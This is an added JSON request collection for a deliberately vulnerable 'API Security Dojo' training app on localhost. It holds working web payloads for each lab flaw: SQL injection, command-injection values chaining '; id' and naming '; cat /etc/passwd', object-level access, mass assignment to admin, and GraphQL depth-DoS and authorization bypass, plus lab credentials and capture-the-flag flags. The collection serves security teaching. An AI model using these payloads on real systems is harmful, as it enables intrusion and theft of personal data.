@@ -1,0 +1,271 @@
+{
+  "resources": {
+    "workspaces": [
+      {
+        "id": "ws_dojo",
+        "name": "API Security Dojo",
+        "description": "Collection for testing API Security Dojo vulnerabilities (V01-V10, G01-G05)"
+      }
+    ],
+    "environments": [
+      {
+        "id": "env_python",
+        "workspaceId": "ws_dojo",
+        "name": "Python/FastAPI",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:8000"},
+          {"name": "token", "value": ""}
+        ]
+      },
+      {
+        "id": "env_node",
+        "workspaceId": "ws_dojo",
+        "name": "Node/Express",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:3001"},
+          {"name": "token", "value": ""}
+        ]
+      },
+      {
+        "id": "env_go",
+        "workspaceId": "ws_dojo",
+        "name": "Go/Gin",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:3002"},
+          {"name": "token", "value": ""}
+        ]
+      },
+      {
+        "id": "env_php",
+        "workspaceId": "ws_dojo",
+        "name": "PHP",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:3003"},
+          {"name": "token", "value": ""}
+        ]
+      },
+      {
+        "id": "env_java",
+        "workspaceId": "ws_dojo",
+        "name": "Java/Spring",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:3004"},
+          {"name": "token", "value": ""}
+        ]
+      },
+      {
+        "id": "env_rust",
+        "workspaceId": "ws_dojo",
+        "name": "Rust/Actix",
+        "variables": [
+          {"name": "baseUrl", "value": "http://localhost:3006"},
+          {"name": "token", "value": ""}
+        ]
+      }
+    ],
+    "folders": [
+      {"id": "fld_auth", "workspaceId": "ws_dojo", "name": "Auth"},
+      {"id": "fld_users", "workspaceId": "ws_dojo", "name": "Users (V01, V03, V05)"},
+      {"id": "fld_products", "workspaceId": "ws_dojo", "name": "Products (V06 SQLi)"},
+      {"id": "fld_tools", "workspaceId": "ws_dojo", "name": "Tools (V07, V08)"},
+      {"id": "fld_legacy", "workspaceId": "ws_dojo", "name": "Legacy API (V09)"},
+      {"id": "fld_graphql", "workspaceId": "ws_dojo", "name": "GraphQL (G01-G05)"}
+    ],
+    "httpRequests": [
+      {
+        "id": "req_login",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_auth",
+        "name": "Login",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/login",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"username\": \"john\", \"password\": \"password123\"}"},
+        "description": "Login to get JWT token. Credentials: admin:admin123, john:password123, jane:password456"
+      },
+      {
+        "id": "req_register",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_auth",
+        "name": "Register",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/register",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"username\": \"newuser\", \"email\": \"new@example.com\", \"password\": \"weak\"}"},
+        "description": "V02: No password strength validation"
+      },
+      {
+        "id": "req_me",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_auth",
+        "name": "Get Current User (V03)",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/me",
+        "headers": [{"name": "Authorization", "value": "Bearer {{token}}"}],
+        "description": "V03: Excessive Data Exposure - Returns SSN, credit card, secret_note with flag"
+      },
+      {
+        "id": "req_v01_bola",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_users",
+        "name": "V01 BOLA - Get Admin Data",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/1",
+        "headers": [{"name": "Authorization", "value": "Bearer {{token}}"}],
+        "description": "V01: BOLA - Login as john, access admin (id=1) data. Flag in secret_note: VULNAPI{bola_user_data_exposed}"
+      },
+      {
+        "id": "req_list_users",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_users",
+        "name": "List Users (V03)",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users",
+        "headers": [{"name": "Authorization", "value": "Bearer {{token}}"}],
+        "description": "V03: Returns all users with sensitive data"
+      },
+      {
+        "id": "req_v05_mass",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_users",
+        "name": "V05 Mass Assignment - Escalate to Admin",
+        "method": "PUT",
+        "url": "{{baseUrl}}/api/users/2",
+        "headers": [{"name": "Content-Type", "value": "application/json"}, {"name": "Authorization", "value": "Bearer {{token}}"}],
+        "body": {"mimeType": "application/json", "text": "{\"username\": \"john\", \"email\": \"john@example.com\", \"role\": \"admin\"}"},
+        "description": "V05: Mass Assignment - Add role:admin to become admin. Flag: VULNAPI{mass_assignment_privilege_escalation}"
+      },
+      {
+        "id": "req_products",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_products",
+        "name": "List Products",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/products",
+        "description": "Normal product listing (hidden products not shown)"
+      },
+      {
+        "id": "req_v06_sqli_basic",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_products",
+        "name": "V06 SQLi - OR 1=1",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/products?search=' OR 1=1--",
+        "description": "V06: SQL Injection - Returns ALL products including hidden. Hidden product has flag in description"
+      },
+      {
+        "id": "req_v06_sqli_union",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_products",
+        "name": "V06 SQLi - UNION Extract Flags",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/products?search=' UNION SELECT 1,flag_value,description,4,5,6,7,8,9,10 FROM flags--",
+        "description": "V06: UNION attack to extract flags table. Flag: VULNAPI{sqli_database_dumped}"
+      },
+      {
+        "id": "req_v07_ping",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_tools",
+        "name": "V07 CMDi - Ping",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/tools/ping",
+        "headers": [{"name": "Content-Type", "value": "application/json"}, {"name": "Authorization", "value": "Bearer {{token}}"}],
+        "body": {"mimeType": "application/json", "text": "{\"host\": \"127.0.0.1; id\"}"},
+        "description": "V07: Command Injection - Inject ; id or ; cat /etc/passwd. Flag: VULNAPI{cmd_injection_rce_achieved}"
+      },
+      {
+        "id": "req_v07_dns",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_tools",
+        "name": "V07 CMDi - DNS",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/tools/dns",
+        "headers": [{"name": "Content-Type", "value": "application/json"}, {"name": "Authorization", "value": "Bearer {{token}}"}],
+        "body": {"mimeType": "application/json", "text": "{\"domain\": \"example.com; whoami\"}"},
+        "description": "V07: Command Injection in DNS lookup"
+      },
+      {
+        "id": "req_v08_debug",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_tools",
+        "name": "V08 Debug Endpoint",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/tools/debug",
+        "description": "V08: Security Misconfiguration - Debug endpoint exposed. Flag: VULNAPI{misconfig_cors_headers_missing}"
+      },
+      {
+        "id": "req_v09_legacy_users",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_legacy",
+        "name": "V09 Legacy API - List Users",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/v1/users",
+        "description": "V09: Old API without auth, exposes password_hash! Flag: VULNAPI{version_legacy_api_exposed}"
+      },
+      {
+        "id": "req_v09_legacy_user",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_legacy",
+        "name": "V09 Legacy API - Get User",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/v1/users/1",
+        "description": "V09: Get admin data with password hash from legacy API"
+      },
+      {
+        "id": "req_g01_introspection",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_graphql",
+        "name": "G01 Introspection",
+        "method": "POST",
+        "url": "{{baseUrl}}/graphql",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"query\": \"{ __schema { types { name fields { name } } } }\"}"},
+        "description": "G01: GraphQL Introspection exposed - discover entire schema"
+      },
+      {
+        "id": "req_g02_nested",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_graphql",
+        "name": "G02 Nested Query DoS",
+        "method": "POST",
+        "url": "{{baseUrl}}/graphql",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"query\": \"{ users { orders { user { orders { user { orders { user { username } } } } } } } }\"}"},
+        "description": "G02: No depth limit - deeply nested queries cause DoS"
+      },
+      {
+        "id": "req_g03_batching",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_graphql",
+        "name": "G03 Batching Attack",
+        "method": "POST",
+        "url": "{{baseUrl}}/graphql",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "[{\"query\": \"{ user(id: 1) { username } }\"}, {\"query\": \"{ user(id: 2) { username } }\"}, {\"query\": \"{ user(id: 3) { username } }\"}]"},
+        "description": "G03: Batching - multiple queries bypass rate limiting"
+      },
+      {
+        "id": "req_g04_suggestions",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_graphql",
+        "name": "G04 Field Suggestions",
+        "method": "POST",
+        "url": "{{baseUrl}}/graphql",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"query\": \"{ users { pasword } }\"}"},
+        "description": "G04: Error suggests 'Did you mean password_hash?' - schema enumeration"
+      },
+      {
+        "id": "req_g05_authbypass",
+        "workspaceId": "ws_dojo",
+        "folderId": "fld_graphql",
+        "name": "G05 Authorization Bypass",
+        "method": "POST",
+        "url": "{{baseUrl}}/graphql",
+        "headers": [{"name": "Content-Type", "value": "application/json"}],
+        "body": {"mimeType": "application/json", "text": "{\"query\": \"{ users { id username ssn creditCard secretNote apiKey } }\"}"},
+        "description": "G05: No auth on sensitive fields - get SSN, credit cards, flags without login"
+      }
+    ]
+  }
+}
